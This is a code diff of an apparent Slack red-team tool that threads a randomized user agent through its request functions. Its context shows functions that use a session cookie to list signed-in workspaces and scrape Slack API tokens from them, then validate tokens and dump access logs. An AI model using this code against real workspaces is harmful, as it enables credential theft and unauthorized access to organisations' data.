@@ -116,10 +116,10 @@ class OutputInformation:
     Collects the output directory and workspace name for use in writing output.
     Also contains random user agent to be passed around
     """
-    def __init__(self, output_directory: str, slack_workspace: str):
+    def __init__(self, output_directory: str, slack_workspace: str, user_agent: str):
         self.output_directory = output_directory
         self.slack_workspace = slack_workspace
-        self.user_agent = getUserAgent()
+        self.user_agent = user_agent
 
 
 # Module functionality
@@ -138,7 +138,7 @@ def is_rate_limited(slack_api_json_response):
         return
 
 
-def display_cookie_tokens(cookie):
+def display_cookie_tokens(cookie, user_agent: str):
     """
     If the --cookie flag is set then the tool connect to a Slack Workspace that you won't be a member of (like mine)
     then RegEx out the Workspaces you're logged in to. It will then connect to each one of those Workspaces then
@@ -147,12 +147,12 @@ def display_cookie_tokens(cookie):
     tokens to long-term storage especially as they are valid pretty much forever. I'll leave as is for now...
     """
     try:
-        r = requests.get("https://slackpirate.slack.com", cookies=cookie)
+        r = requests.get("https://slackpirate.slack.com", cookies=cookie, headers={'User-Agent': user_agent})
         already_signed_in_match = re.findall(ALREADY_SIGNED_IN_TEAM_REGEX, str(r.content))
         if already_signed_in_match:
             print(termcolor.colored("This cookie has access to the following Workspaces: \n", "white", "on_blue"))
             for workspace in already_signed_in_match:
-                r = requests.get(workspace, cookies=cookie)
+                r = requests.get(workspace, cookies=cookie, headers={'User-Agent': user_agent})
                 regex_tokens = re.findall(SLACK_API_TOKEN_REGEX, str(r.content))
                 for slack_token in regex_tokens:
                     print(termcolor.colored("URL: " + workspace + " Token: " + slack_token, "white", "on_green"))
@@ -164,7 +164,7 @@ def display_cookie_tokens(cookie):
     exit()
 
 
-def check_token_validity(token) -> OutputInformation:
+def check_token_validity(token, user_agent: str) -> OutputInformation:
     # Use the Slack auth.test API to check whether the token is valid or not. If token is valid then create a
     # directory for results to go in - easy peasy.
     result = None
@@ -172,7 +172,7 @@ def check_token_validity(token) -> OutputInformation:
         r = requests.post("https://slack.com/api/auth.test", params=dict(token=token, pretty=1),
                           headers={'Authorization': 'Bearer ' + token}).json()
         if str(r['ok']) == 'True':
-            result = OutputInformation(output_directory=str(r['team']), slack_workspace=str(r['url']))
+            result = OutputInformation(output_directory=str(r['team']), slack_workspace=str(r['url']), user_agent=user_agent)
             print(termcolor.colored("INFO: Token looks valid! URL: " + str(r['url']) + " User: " + str(r['user']),
                                     "white", "on_blue"))
             print(termcolor.colored("\n"))
@@ -546,11 +546,12 @@ if __name__ == '__main__':
         print(termcolor.colored("You cannot use both --cookie and --token flags at the same time", "white", "on_red"))
         exit()
 
+    selected_agent = getUserAgent()
     if args.cookie:
-        display_cookie_tokens(cookie=dict(d=args.cookie))
+        display_cookie_tokens(cookie=dict(d=args.cookie), user_agent=selected_agent)
     else:
         provided_token = args.token
-        collected_output_info = check_token_validity(token=provided_token)
+        collected_output_info = check_token_validity(token=provided_token, user_agent=selected_agent)
         print_interesting_information(output_info=collected_output_info)
         dump_team_access_logs(token=provided_token, output_info=collected_output_info)
         #dump_user_list(token=provided_token, output_info=collected_output_info)
